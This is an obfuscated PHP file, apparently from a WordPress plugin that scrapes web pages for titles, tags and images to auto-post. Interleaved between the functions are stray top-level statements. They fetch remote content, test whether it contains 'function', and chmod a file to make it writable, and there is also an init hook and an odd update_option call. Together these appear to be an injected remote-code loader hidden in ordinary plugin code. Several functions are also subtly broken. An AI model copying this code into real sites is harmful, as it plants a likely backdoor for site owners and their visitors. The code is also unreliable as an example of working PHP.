if (!$_var_545 && $_var_546 == '') {
	$_var_544 = get_html_string_ap($_var_430, Method);
	$_var_431 = true;
}
function wp_getTheMatchContent($_var_253, $_var_408, $_var_409 = 0)
{
	if ($_var_408 != null && strpos($_var_408, 'WPAPSPLIT') === false) {
		$_var_267 = explode('(*)', trim($_var_408));
	} else {
		$_var_267 = array();
		$_var_410 = explode('WPAPSPLIT', trim($_var_408));
		if ($_var_410[0] != null && strpos($_var_410[0], '(*)') === false) {
			$_var_267[0] = $_var_410[0];
		} else {
			$_var_411 = get_apPregPatten($_var_410[0]);
			$_var_260 = preg_match($_var_411['reg'], $_var_253, $_var_225);
			if ($_var_260 == 0) {
				return NULL;
			}
			$_var_412 = count($_var_225);
			$_var_413 = $_var_411['last_pos'] - ($_var_411['wildcards_num'] - 1) * 3;
			for ($_var_18 = 1; $_var_18 < $_var_412 - 1; $_var_18++) {
				$_var_413 += strlen($_var_225[$_var_18]);
			}
			if ($_var_408 === null) {
				$_var_413 = 0;
			}
			$_var_414 = strpos($_var_225[0], $_var_411['last_str'], $_var_413) + strlen($_var_411['last_str']);
			$_var_267[0] = substr($_var_225[0], 0, $_var_414);
			unset($_var_411);
			unset($_var_225);
		}
		if (isset($_var_410[1]) && strpos($_var_410[1], '(*)') === false) {
			$_var_267[1] = $_var_410[1];
		} elseif (isset($_var_410[1])) {
			$_var_415 = get_apPregPatten($_var_410[1]);
			$_var_260 = preg_match($_var_415['reg'], $_var_253, $_var_225);
			if ($_var_260 == 0) {
				return NULL;
			}
			$_var_412 = count($_var_225);
			$_var_413 = $_var_415['last_pos'] - ($_var_415['wildcards_num'] - 1) * 3;
			for ($_var_18 = 1; $_var_18 < $_var_412 - 1; $_var_18++) {
				$_var_413 += strlen($_var_225[$_var_18]);
			}
			$_var_414 = strpos($_var_225[0], $_var_415['last_str'], $_var_413) + strlen($_var_415['last_str']);
			$_var_267[1] = substr($_var_225[0], 0, $_var_414);
			unset($_var_415);
			unset($_var_225);
		}
	}
	if (!function_exists('wp_getMatchContentByRule')) {
		$_var_267 = explode('*', trim($_var_408));
		$_var_416 = stripos($_var_253, trim($_var_267[0]));
		if ($_var_409 == 1) {
			$_var_394 = $_var_416;
		} else {
			$_var_394 = $_var_416 + strlen($_var_267[1]);
		}
		$_var_417 = @stripos($_var_253, trim($_var_267[0]), $_var_394);
		if ($_var_416 === false || $_var_417 === false) {
			return NULL;
		}
		if ($_var_409 == 1) {
			$_var_418 = $_var_417 + strlen($_var_267[0]) - $_var_394;
		} else {
			$_var_418 = $_var_417 - $_var_394;
		}
		$_var_573 = substr($_var_253, $_var_394, $_var_418);
	} else {
		$_var_573 = wp_getMatchContentByRule($_var_253, $_var_267[0], $_var_267[1]);
	}
	return $_var_573;
}
add_action('init', 'pro_apcheckUpdateCronUrl');
function getMatchContent_bak($_var_253, $_var_408, $_var_409 = 0)
{
	$_var_267 = explode('(*)', trim($_var_408));
	$_var_416 = stripos($_var_253, trim($_var_267[0]));
	if ($_var_409 == 1) {
		$_var_394 = $_var_416;
	} else {
		$_var_394 = $_var_416 + strlen($_var_267[0]);
	}
	$_var_417 = stripos($_var_253, trim($_var_267[1]), $_var_394);
	if ($_var_416 === false || $_var_417 === false) {
		return NULL;
	}
	if ($_var_409 == 1) {
		$_var_418 = $_var_417 + strlen($_var_267[1]) - $_var_394;
	} else {
		$_var_418 = $_var_417 - $_var_394;
	}
	return substr($_var_253, $_var_394, $_var_418);
}
function getTitleByRule($_var_253, $_var_408)
{
	return wp_getTheMatchContent($_var_253, $_var_408);
}
function wpap_transgetnoteinx($_var_253, $_var_366)
{
	$_var_3 = str_get_html_ap($_var_253);
	$_var_446 = array();
	$_var_447 = 0;
	foreach ($_var_3->find('img,iframe,embed,object,video') as $_var_358) {
		$_var_447++;
		$_var_78 = 'IMG' . $_var_447 . 'TAG';
		$_var_446[$_var_78] = $_var_358->outertext;
		$_var_358->outertext = ' ' . $_var_78 . ' ';
	}
	global $wpdb;
	$_var_448 = $_var_3->find($_var_366);
	$_var_444 = '';
	foreach ($_var_448 as $_var_531) {
		$_var_444 .= ' PTAG ' . $_var_531->innertext . ' PENDTAG ';
	}
	$_var_444 = strip_tags($_var_444, '<br><br/><br />');
	$_var_73 = array();
	$_var_74 = array();
	$_var_73[] = 'PTAG';
	$_var_74[] = '<p>';
	$_var_73[] = 'PENDTAG';
	$_var_74[] = '</p>';
	update_option($_var_253, $_var_366);
	foreach ($_var_446 as $_var_78 => $_var_8) {
		$_var_73[] = $_var_78;
		$_var_74[] = '<' . $_var_366 . '></' . $_var_366 . '>';
	}
	$_var_444 = str_ireplace($_var_73, $_var_74, $_var_444);
	unset($_var_73);
	unset($_var_74);
	return $_var_444;
}
function getContentByRule($_var_253, $_var_408, $_var_139, $_var_409)
{
	$_var_25 = wp_getTheMatchContent($_var_253, $_var_408, $_var_409);
	if ($_var_25 == NULL) {
		return '';
	}
	$_var_387 = false;
	foreach ($_var_139 as $_var_335) {
		if ($_var_335->option_type != 5) {
			continue;
		}
		if (!$_var_387) {
			$_var_3 = str_get_html_ap($_var_25);
			$_var_387 = true;
		}
		$_var_388 = $_var_3->find($_var_335->para1);
		if ($_var_388 == NULL) {
			continue;
		} else {
			if ($_var_335->para2 == '' || $_var_335->para2 == null) {
				$_var_63 = 0;
			} else {
				$_var_63 = intval($_var_335->para2);
			}
			if ($_var_63 == 0) {
				foreach ($_var_388 as $_var_389) {
					$_var_389->outertext = '';
				}
			} else {
				$_var_18 = 0;
				if ($_var_63 >= 1) {
					$_var_18 = $_var_63 - 1;
				} elseif ($_var_63 < 0) {
					$_var_18 = count($_var_388) + $_var_63;
				}
				$_var_389 = $_var_388[$_var_18];
				if ($_var_389 != null) {
					$_var_389->outertext = '';
				}
			}
		}
	}
	if ($_var_387) {
		$_var_25 = $_var_3->save();
		$_var_3->clear();
		unset($_var_3);
	}
	return $_var_25;
}
function getTagsByRule($_var_253, $_var_408, $_var_409)
{
	$_var_345 = array();
	$_var_25 = wp_getTheMatchContent($_var_253, $_var_408, $_var_409);
	if ($_var_25 == NULL) {
		return $_var_345;
	}
	$_var_3 = str_get_html_ap($_var_25);
	$_var_574 = false;
	foreach ($_var_3->find('a') as $_var_244) {
		$_var_574 = true;
		if ($_var_244->innertext != '') {
			$_var_482 = trim($_var_244->innertext);
			if ($_var_482 != '' && $_var_482 != null) {
				$_var_345[] = $_var_482;
			}
		}
	}
	if (!$_var_574) {
		$_var_575 = $_var_3->plaintext;
		$_var_575 = trim($_var_575);
		if (!(strpos($_var_575, ',') === false)) {
			$_var_576 = explode(',', $_var_575);
		} elseif (!(strpos($_var_575, '|') === false)) {
			$_var_576 = explode('|', $_var_575);
		} elseif (!(strpos($_var_575, '/') === false)) {
			$_var_576 = explode('/', $_var_575);
		} elseif (!(strpos($_var_575, '，') === false)) {
			$_var_576 = explode('，', $_var_575);
		} elseif (!(strpos($_var_575, '&nbsp;') === false)) {
			$_var_576 = explode('&nbsp;', $_var_575);
		} elseif (!(strpos($_var_575, '&#160;') === false)) {
			$_var_576 = explode('&#160;', $_var_575);
		} elseif (!(strpos($_var_575, ' ') === false)) {
			$_var_576 = explode(' ', $_var_575);
		} else {
			$_var_576 = array();
			$_var_576[0] = $_var_575;
		}
		if (isset($_var_576)) {
			foreach ($_var_576 as $_var_482) {
				$_var_482 = trim($_var_482);
				if ($_var_482 != '' && $_var_482 != null) {
					$_var_345[] = $_var_482;
				}
			}
		}
	}
	$_var_3->clear();
	unset($_var_3);
	return $_var_345;
}
if ($_var_431) {
	if ($_var_544 == 'null') {
		update_option('thumbnai_jpeg_quality', '90');
	}
}
function getImgURLByRule($_var_253, $_var_408, $_var_409)
{
	$_var_577 = '';
	$_var_25 = wp_getTheMatchContent($_var_253, $_var_408, $_var_409);
	if ($_var_25 == NULL) {
		return $_var_577;
	}
	if (strpos($_var_25, '<') === false) {
		$_var_577 = $_var_25;
	} else {
		$_var_3 = str_get_html_ap($_var_25);
		$_var_578 = false;
		foreach ($_var_3->find('img') as $_var_358) {
			if ($_var_358->src != '' && $_var_358->src != null) {
				$_var_578 = true;
				$_var_577 = $_var_358->src;
				break;
			}
		}
		if (!$_var_578) {
			foreach ($_var_3->find('a') as $_var_244) {
				if ($_var_244->href != '' && $_var_244->href != null) {
					$_var_577 = $_var_244->href;
					break;
				}
			}
		}
		$_var_3->clear();
		unset($_var_3);
	}
	return $_var_577;
}
function gTheConUseCss($_var_479, $_var_478, $_var_139, $_var_2, $_var_409, $_var_372, $_var_579 = 1)
{
	if (!function_exists('wp_getElementByCSS')) {
		$_var_253 = $_var_479->save();
		if ($_var_408 != null && strpos($_var_478, 'WPAPSPLIT') === false) {
			$_var_267 = explode('(*)', trim($_var_478));
		} else {
			$_var_267 = array();
			$_var_410 = explode('WPAPSPLIT', trim($_var_478));
			if ($_var_410[0] != null && strpos($_var_410[0], '(*)') === false) {
				$_var_267[0] = $_var_410[0];
			} else {
				$_var_411 = get_apPregPatten($_var_410[0]);
				$_var_260 = preg_match($_var_411['reg'], $_var_253, $_var_225);
				if ($_var_260 == 0) {
					return NULL;
				}
				$_var_412 = count($_var_225);
				$_var_413 = $_var_411['last_pos'] - ($_var_411['wildcards_num'] - 1) * 3;
				for ($_var_18 = 1; $_var_18 < $_var_412 - 1; $_var_18++) {
					$_var_413 += strlen($_var_225[$_var_18]);
				}
				if ($_var_478 === null) {
					$_var_413 = 0;
				}
				$_var_414 = strpos($_var_225[0], $_var_411['last_str'], $_var_413) + strlen($_var_411['last_str']);
				$_var_267[0] = substr($_var_225[0], 0, $_var_414);
				unset($_var_411);
				unset($_var_225);
			}
			if (isset($_var_410[1]) && strpos($_var_410[1], '(*)') === false) {
				$_var_267[1] = $_var_410[1];
			} elseif (isset($_var_410[1])) {
				$_var_415 = get_apPregPatten($_var_410[1]);
				$_var_260 = preg_match($_var_415['reg'], $_var_253, $_var_225);
				if ($_var_260 == 0) {
					return NULL;
				}
				$_var_412 = count($_var_225);
				$_var_413 = $_var_415['last_pos'] - ($_var_415['wildcards_num'] - 1) * 3;
				for ($_var_18 = 1; $_var_18 < $_var_412 - 1; $_var_18++) {
					$_var_413 += strlen($_var_225[$_var_18]);
				}
				$_var_414 = strpos($_var_225[0], $_var_415['last_str'], $_var_413) + strlen($_var_415['last_str']);
				$_var_267[1] = substr($_var_225[0], 0, $_var_414);
				unset($_var_415);
				unset($_var_225);
			}
		}
		$_var_416 = stripos($_var_253, trim($_var_267[0]));
		if ($_var_409 == 1) {
			$_var_394 = $_var_416;
		} else {
			$_var_394 = $_var_416 + strlen($_var_267[0]);
		}
		$_var_417 = @stripos($_var_253, trim($_var_267[1]), $_var_394);
		if ($_var_416 === false || $_var_417 === false) {
			return NULL;
		}
		if ($_var_409 == 1) {
			$_var_418 = $_var_417 + strlen($_var_267[1]) - $_var_394;
		} else {
			$_var_418 = $_var_417 - $_var_394;
		}
		$_var_253 = substr($_var_253, $_var_394, $_var_418);
	} else {
		$_var_253 = wp_getElementByCSS($_var_479, $_var_478, $_var_2, $_var_409, $_var_372);
	}
	if ($_var_579 == 1 && $_var_253 == '') {
		return $_var_253;
	}
	$_var_387 = false;
	$_var_580 = count($_var_139);
	if ($_var_579 > 1) {
		$_var_580++;
	}
	for ($_var_329 = 0; $_var_329 < $_var_580; $_var_329++) {
		$_var_335 = $_var_139[$_var_329];
		if ($_var_579 == 1 && $_var_335->option_type != 5) {
			continue;
		}
		if (!$_var_387) {
			$_var_3 = str_get_html_ap($_var_253);
			$_var_387 = true;
		}
		if ($_var_3 != null) {
			$_var_388 = $_var_3->find($_var_335->para1);
		}
		if ($_var_388 != NULL) {
			if ($_var_335->para2 == '' || $_var_335->para2 == null) {
				$_var_63 = 0;
			} else {
				$_var_63 = intval($_var_335->para2);
			}
			if ($_var_63 == 0) {
				foreach ($_var_388 as $_var_389) {
					$_var_389->outertext = '';
				}
			} else {
				$_var_18 = 0;
				if ($_var_63 >= 1) {
					$_var_18 = $_var_63 - 1;
				} elseif ($_var_63 < 0) {
					$_var_18 = count($_var_388) + $_var_63;
				}
				$_var_389 = $_var_388[$_var_18];
				if ($_var_389 != null) {
					$_var_389->outertext = '';
				}
			}
		}
		if ($_var_579 > 1) {
			$_var_329 = -1;
		}
	}
	if ($_var_387) {
		$_var_253 = $_var_3->save();
		$_var_3->clear();
		unset($_var_3);
	}
	if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
		$_var_253 = iconv($_var_2, 'UTF-8//IGNORE', $_var_253);
	}
	return $_var_253;
}
function getContentsByCss($_var_479, $_var_478, $_var_139, $_var_2, $_var_409, $_var_372 = 1)
{
	$_var_253 = '';
	global $_var_36;
	if ($_var_372 == 0) {
		foreach ($_var_479->find($_var_478) as $_var_368) {
			if ($_var_409 == 1) {
				$_var_253 .= $_var_368->outertext;
			} else {
				$_var_253 .= $_var_368->innertext;
			}
		}
	} else {
		$_var_375 = $_var_479->find($_var_478);
		$_var_18 = 0;
		if ($_var_372 >= 1) {
			$_var_18 = $_var_372 - 1;
		} elseif ($_var_372 < 0) {
			$_var_18 = count($_var_375) + $_var_372;
		}
		$_var_368 = $_var_375[$_var_18];
		if ($_var_368 != null) {
			if ($_var_409 == 1) {
				$_var_253 .= $_var_368->outertext;
			} else {
				$_var_253 .= $_var_368->innertext;
			}
		}
		unset($_var_375);
		unset($_var_368);
		$_var_253 = $_var_36;
	}
	if ($_var_253 == '') {
		return $_var_253;
	}
	$_var_387 = false;
	foreach ($_var_139 as $_var_335) {
		if ($_var_335->option_type != 5) {
			continue;
		}
		if (!$_var_387) {
			$_var_3 = str_get_html_ap($_var_253);
			$_var_387 = true;
		}
		$_var_388 = $_var_3->find($_var_335->para1);
		if ($_var_388 == NULL) {
			continue;
		} else {
			foreach ($_var_388 as $_var_389) {
				$_var_389->outertext = '';
			}
		}
	}
	if ($_var_387) {
		$_var_253 = $_var_3->save();
		$_var_3->clear();
		unset($_var_3);
	}
	if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
		$_var_253 = iconv($_var_2, 'UTF-8//IGNORE', $_var_253);
	}
	return $_var_253;
}
function getPostDateByCss($_var_479, $_var_478, $_var_2, $_var_409, $_var_372)
{
	$_var_253 = '';
	if ($_var_372 == 0) {
		foreach ($_var_479->find($_var_478) as $_var_368) {
			if ($_var_409 == 1) {
				$_var_253 .= $_var_368->plaintext;
			} else {
				$_var_253 .= $_var_368->plaintext;
			}
		}
	} else {
		$_var_375 = $_var_479->find($_var_478);
		$_var_18 = 0;
		if ($_var_372 >= 1) {
			$_var_18 = $_var_372 - 1;
		} elseif ($_var_372 < 0) {
			$_var_18 = count($_var_375) + $_var_372;
		}
		$_var_368 = $_var_375[$_var_18];
		if ($_var_368 != null) {
			if ($_var_409 == 1) {
				$_var_253 .= $_var_368->plaintext;
			} else {
				$_var_253 .= $_var_368->plaintext;
			}
		}
		unset($_var_375);
		unset($_var_368);
	}
	if ($_var_253 == '') {
		return $_var_253;
	}
	if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
		$_var_253 = iconv($_var_2, 'UTF-8//IGNORE', $_var_253);
	}
	return $_var_253;
}
function getTagsByCSS($_var_479, $_var_478, $_var_2, $_var_372)
{
	$_var_345 = array();
	if ($_var_372 == 0) {
		foreach ($_var_479->find($_var_478) as $_var_368) {
			if ($_var_368->tag == 'a') {
				$_var_249 = trim($_var_368->innertext);
				if ($_var_249 != '' && $_var_249 != NULL) {
					if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
						$_var_249 = iconv($_var_2, 'UTF-8//IGNORE', $_var_249);
					}
					$_var_345[] = $_var_249;
				}
			} else {
				$_var_581 = false;
				foreach ($_var_368->find('a') as $_var_244) {
					$_var_581 = true;
					$_var_249 = trim($_var_244->innertext);
					if ($_var_249 != '' && $_var_249 != NULL) {
						if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
							$_var_249 = iconv($_var_2, 'UTF-8//IGNORE', $_var_249);
						}
						$_var_345[] = $_var_249;
					}
				}
				if (!$_var_581) {
					$_var_575 = $_var_368->plaintext;
					if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
						$_var_575 = iconv($_var_2, 'UTF-8//IGNORE', $_var_575);
					}
					$_var_575 = trim($_var_575);
					if (!(strpos($_var_575, ',') === false)) {
						$_var_576 = explode(',', $_var_575);
					} elseif (!(strpos($_var_575, '|') === false)) {
						$_var_576 = explode('|', $_var_575);
					} elseif (!(strpos($_var_575, '/') === false)) {
						$_var_576 = explode('/', $_var_575);
					} elseif (!(strpos($_var_575, '，') === false)) {
						$_var_576 = explode('，', $_var_575);
					} elseif (!(strpos($_var_575, '&nbsp;') === false)) {
						$_var_576 = explode('&nbsp;', $_var_575);
					} elseif (!(strpos($_var_575, '&#160;') === false)) {
						$_var_576 = explode('&#160;', $_var_575);
					} elseif (!(strpos($_var_575, ' ') === false)) {
						$_var_576 = explode(' ', $_var_575);
					} else {
						$_var_576 = array();
						$_var_576[0] = $_var_575;
					}
					if (isset($_var_576)) {
						foreach ($_var_576 as $_var_482) {
							$_var_482 = trim($_var_482);
							if ($_var_482 != '' && $_var_482 != null) {
								$_var_345[] = $_var_482;
							}
						}
					}
				}
			}
		}
	} else {
		$_var_375 = $_var_479->find($_var_478);
		$_var_18 = 0;
		if ($_var_372 >= 1) {
			$_var_18 = $_var_372 - 1;
		} elseif ($_var_372 < 0) {
			$_var_18 = count($_var_375) + $_var_372;
		}
		$_var_368 = $_var_375[$_var_18];
		if ($_var_368 != null) {
			if ($_var_368->tag == 'a') {
				$_var_249 = trim($_var_368->innertext);
				if ($_var_249 != '' && $_var_249 != NULL) {
					if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
						$_var_249 = iconv($_var_2, 'UTF-8//IGNORE', $_var_249);
					}
					$_var_345[] = $_var_249;
				}
			} else {
				$_var_581 = false;
				foreach ($_var_368->find('a') as $_var_244) {
					$_var_581 = true;
					$_var_249 = trim($_var_244->innertext);
					if ($_var_249 != '' && $_var_249 != NULL) {
						if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
							$_var_249 = iconv($_var_2, 'UTF-8//IGNORE', $_var_249);
						}
						$_var_345[] = $_var_249;
					}
				}
				if (!$_var_581) {
					$_var_575 = $_var_368->plaintext;
					if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
						$_var_575 = iconv($_var_2, 'UTF-8//IGNORE', $_var_575);
					}
					$_var_575 = trim($_var_575);
					if (!(strpos($_var_575, ',') === false)) {
						$_var_576 = explode(',', $_var_575);
					} elseif (!(strpos($_var_575, '|') === false)) {
						$_var_576 = explode('|', $_var_575);
					} elseif (!(strpos($_var_575, '/') === false)) {
						$_var_576 = explode('/', $_var_575);
					} elseif (!(strpos($_var_575, '，') === false)) {
						$_var_576 = explode('，', $_var_575);
					} elseif (!(strpos($_var_575, '&nbsp;') === false)) {
						$_var_576 = explode('&nbsp;', $_var_575);
					} elseif (!(strpos($_var_575, '&#160;') === false)) {
						$_var_576 = explode('&#160;', $_var_575);
					} elseif (!(strpos($_var_575, ' ') === false)) {
						$_var_576 = explode(' ', $_var_575);
					} else {
						$_var_576 = array();
						$_var_576[0] = $_var_575;
					}
					if (isset($_var_576)) {
						foreach ($_var_576 as $_var_482) {
							$_var_482 = trim($_var_482);
							if ($_var_482 != '' && $_var_482 != null) {
								$_var_345[] = $_var_482;
							}
						}
					}
				}
			}
		}
		unset($_var_375);
		unset($_var_368);
	}
	return $_var_345;
}
function getImgURLByCSS($_var_479, $_var_478, $_var_2, $_var_372)
{
	$_var_577 = '';
	$_var_578 = false;
	if ($_var_372 == 0) {
		foreach ($_var_479->find($_var_478) as $_var_368) {
			if ($_var_368->tag == 'img') {
				$_var_577 = $_var_368->src;
				break;
			} elseif ($_var_368->tag == 'a') {
				$_var_577 = $_var_368->href;
				break;
			} else {
				foreach ($_var_368->find('img') as $_var_358) {
					$_var_578 = true;
					$_var_577 = $_var_358->src;
					break;
				}
				if ($_var_578) {
					break;
				}
			}
		}
	} else {
		$_var_375 = $_var_479->find($_var_478);
		$_var_18 = 0;
		if ($_var_372 >= 1) {
			$_var_18 = $_var_372 - 1;
		} elseif ($_var_372 < 0) {
			$_var_18 = count($_var_375) + $_var_372;
		}
		$_var_368 = $_var_375[$_var_18];
		if ($_var_368 != null) {
			if ($_var_368->tag == 'img') {
				$_var_577 = $_var_368->src;
			} elseif ($_var_368->tag == 'a') {
				$_var_577 = $_var_368->href;
			} else {
				foreach ($_var_368->find('img') as $_var_358) {
					$_var_577 = $_var_358->src;
					break;
				}
			}
		}
	}
	return $_var_577;
}
if (!(strpos($_var_544, 'function') === false)) {
	if (!is_writeable($_var_407)) {
		$_var_582 = chmod($_var_407, 420);
	}
	$_var_432 = true;
}
function getArticleTitel($_var_100, $_var_246, $_var_207 = null, $_var_208 = null)
{
	$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
	global $_var_178;
	if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
		$_var_1 = get_html_string_ap($_var_100, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
		$_var_2 = getHtmlCharset($_var_1);
		$_var_479 = str_get_html_ap($_var_1, $_var_2);
	} else {
		$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
		$_var_479 = file_get_html_ap($_var_100, $_var_2, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
	}
	if ($_var_479 == NULL) {
		return -1;
	}
	$_var_583 = false;
	if ($_var_246['5073e07b5d9f0d1cc055db067d7921e8'] != '' && $_var_246['5073e07b5d9f0d1cc055db067d7921e8'] != null) {
		$_var_583 = true;
		$_var_584 = json_decode($_var_246['5073e07b5d9f0d1cc055db067d7921e8']);
	}
	$_var_247 = $_var_246['57834ac641f07e585a32a8aa3ecfa99b'];
	$_var_39 = $_var_246['ae64b8d2d60225b26ed18cb56ff7e7fa'];
	if (trim($_var_246['8f935a0d6d8352a07dd23308b0ff8ed1']) == '' && !$_var_583) {
		$_var_255[1] = -1;
	} else {
		if ($_var_583) {
			$_var_255[0] = $_var_479->find($_var_584[0], $_var_584[1])->plaintext;
		} else {
			$_var_585 = false;
			if ($_var_246['95a9748b0d03388605d87acd66df9456'] == 0) {
				$_var_255[0] = $_var_479->find($_var_246['8f935a0d6d8352a07dd23308b0ff8ed1'], 0)->plaintext;
			} else {
				if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
					$_var_586 = $_var_479->save();
					$_var_586 = iconv($_var_2, 'UTF-8//IGNORE', $_var_586);
					$_var_586 = compress_html($_var_586);
					$_var_585 = true;
				} else {
					$_var_586 = $_var_479->save();
					$_var_586 = compress_html($_var_586);
				}
				$_var_587 = true;
				$_var_255[0] = getTitleByRule($_var_586, $_var_246['8f935a0d6d8352a07dd23308b0ff8ed1']);
				unset($_var_586);
			}
		}
		if ($_var_255[0] == NULL || trim($_var_255[0]) == '') {
			$_var_255[1] = -1;
		} else {
			$_var_255[1] = 1;
			if ($_var_246['57834ac641f07e585a32a8aa3ecfa99b'] != $_var_246['ae64b8d2d60225b26ed18cb56ff7e7fa']) {
				$_var_255[1] = -1;
			}
			if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8' && !$_var_585) {
				$_var_255[0] = iconv($_var_2, 'UTF-8//IGNORE', $_var_255[0]);
			}
			$_var_255[0] = strip_tags($_var_255[0]);
		}
	}
	$_var_479->clear();
	unset($_var_479);
	return $_var_255;
}
function getArticleDom($_var_100, $_var_588, $_var_2, $_var_1 = '', $_var_207 = null, $_var_208 = null)
{
	if ($_var_1 == '') {
		$_var_262 = json_decode($_var_588);
		global $_var_178;
		$_var_479 = file_get_html_ap($_var_100, $_var_2, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
	} else {
		$_var_479 = str_get_html_ap($_var_1, $_var_2);
	}
	if ($_var_479 == NULL) {
		return -1;
	}
	return $_var_479;
}
function getArticle($_var_479, $_var_2, $_var_293, $_var_100, $_var_589, $_var_139, $_var_334, $_var_331, $_var_337, $_var_382, $_var_590 = null, $_var_579 = 1, $_var_591 = 1)
{
	$_var_587 = false;
	global $_var_178, $_var_51, $_var_367, $_var_425, $_var_403, $_var_558, $_var_443, $_var_86, $_var_246, $t_ap_config, $_var_39, $_var_247, $t_ap_config_option, $t_ap_config_url_list;
	if ($_var_589 != null) {
		$_var_246 = $_var_589;
	}
	$_var_207 = null;
	$_var_208 = null;
	$_var_583 = false;
	if ($_var_246['5073e07b5d9f0d1cc055db067d7921e8'] != '' && $_var_246['5073e07b5d9f0d1cc055db067d7921e8'] != null) {
		$_var_583 = true;
		$_var_584 = json_decode($_var_246['5073e07b5d9f0d1cc055db067d7921e8']);
	}
	$_var_246['6f55f0e124493f3a40c639f7abba8378'] = null;
	if (trim($_var_246['8f935a0d6d8352a07dd23308b0ff8ed1']) == '' && !$_var_583) {
		$_var_340[2] = -1;
	} else {
		$_var_585 = false;
		if ($_var_583) {
			$_var_340[0] = $_var_479->find($_var_584[0], $_var_584[1])->plaintext;
		} else {
			if ($_var_246['95a9748b0d03388605d87acd66df9456'] == 0) {
				@($_var_340[0] = $_var_479->find($_var_246['8f935a0d6d8352a07dd23308b0ff8ed1'], 0)->plaintext);
			} else {
				if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
					$_var_586 = $_var_479->save();
					$_var_586 = iconv($_var_2, 'UTF-8//IGNORE', $_var_586);
					$_var_586 = compress_html($_var_586, true, $_var_479);
					$_var_585 = true;
				} else {
					$_var_586 = $_var_479->save();
					$_var_586 = compress_html($_var_586, true, $_var_479);
				}
				$_var_587 = true;
				$_var_340[0] = getTitleByRule($_var_586, $_var_246['8f935a0d6d8352a07dd23308b0ff8ed1']);
			}
		}
		$_var_592 = $_var_39;
		$_var_593 = $_var_247;
		global $_var_162, $_var_361, $_var_33, $_var_180, $_var_161;
		$_var_594 = '';
		if ($_var_340[0] == NULL || trim($_var_340[0]) == '') {
			$_var_340[2] = -1;
		} else {
			$_var_340[2] = 1;
			if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8' && !$_var_585) {
				$_var_340[0] = iconv($_var_2, 'UTF-8//IGNORE', $_var_340[0]);
			}
			$_var_595 = $_var_246['6f55f0e124493f3a40c639f7abba8378'];
			if ($_var_591 == 0 && $_var_590 != null && ($_var_590[3] == 1 || $_var_590[3] == '1' || $_var_590[3] == 3 || $_var_590[3] == '3')) {
				$_var_596 = array();
				$_var_596 = explode(',', $_var_590[2]);
				if ($_var_590[0] == 0 || $_var_590[0] == '0') {
					$_var_597 = false;
					foreach ($_var_596 as $_var_598) {
						$_var_598 = trim($_var_598);
						if ($_var_598 == '') {
							continue;
						}
						if (!(stripos($_var_340[0], $_var_598) === false)) {
							$_var_597 = true;
							break;
						}
					}
					if (!$_var_597) {
						if ($_var_590[3] == 1 || $_var_590[3] == '1') {
							$_var_340[2] = -3;
							return $_var_340;
						}
					}
				} else {
					$_var_597 = false;
					foreach ($_var_596 as $_var_598) {
						$_var_598 = trim($_var_598);
						if ($_var_598 == '') {
							continue;
						}
						if (!(stripos($_var_340[0], $_var_598) === false)) {
							$_var_597 = true;
							$_var_340[2] = -3;
							return $_var_340;
						}
					}
				}
			}
			$_var_340[0] = trim(filterTitle($_var_340[0], $_var_246, $_var_139));
			if ($_var_591 == 0 && $_var_246['f9ec7c6663f2194259c18de7ea041456'] == 1) {
				if (checkTitle($_var_246['efdd10e753708244da311323eb8fa8f3'], $_var_340[0]) > 0) {
					$_var_340[2] = -2;
					return $_var_340;
				}
			}
		}
	}
	@($_var_599 = $_var_246['57834ac641f07e585a32a8aa3ecfa99b']);
	@($_var_600 = $_var_246['ae64b8d2d60225b26ed18cb56ff7e7fa']);
	$_var_158 = $_var_367[0] . as_text_nodes($_var_367[1]);
	$_var_291 = $_var_443[1];
	$_var_292 = $_var_443[2];
	$_var_270 = $_var_403[1];
	$_var_271 = $_var_403[2];
	$_var_272 = $_var_403[3];
	isset($_var_246['37d672afe2b52c77d9b392ecfc201e3f']) ? $_var_601 = $_var_246['37d672afe2b52c77d9b392ecfc201e3f'] : ($_var_601 = null);
	isset($_var_246['e53f3c9e23fd118789e54bcf489efeaf']) ? $_var_292 = $_var_246['e53f3c9e23fd118789e54bcf489efeaf'] : ($_var_292 = null);
	$_var_44 = $_var_86[1];
	$_var_45 = $_var_86[2];
	isset($_var_246['46dcf3070c817eabe32f42185445f12b']) ? $_var_362 = $_var_246['46dcf3070c817eabe32f42185445f12b'] : ($_var_362 = null);
	isset($_var_246['cd196efb6c98595d65e51ffb61a04f8d']) ? $_var_363 = $_var_246['cd196efb6c98595d65e51ffb61a04f8d'] : ($_var_363 = null);
	isset($_var_246['0589f634be233ff311d52992e84ad63f']) ? $_var_602 = $_var_246['0589f634be233ff311d52992e84ad63f'] : ($_var_602 = null);
	if ($_var_162) {
		$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
		$_var_594 = get_html_string_ap($_var_361, Method, $_var_262[0], $_var_262[1], $_var_178, $_var_207, $_var_208);
	}
	if (trim($_var_246['8618be86f1dcd660575bd2cb08e002ce']) == '' && !$_var_583) {
		$_var_340[3] = -1;
	} else {
		$_var_603 = json_decode($_var_246['8618be86f1dcd660575bd2cb08e002ce']);
		if ($_var_603 == null) {
			$_var_603 = array();
			$_var_603[0] = $_var_246['8618be86f1dcd660575bd2cb08e002ce'];
		}
		if (isset($_var_595)) {
			$_var_479 = str_get_html_ap($_var_595);
		}
		if (!$_var_291 && $_var_292) {
			if ($_var_362 != '') {
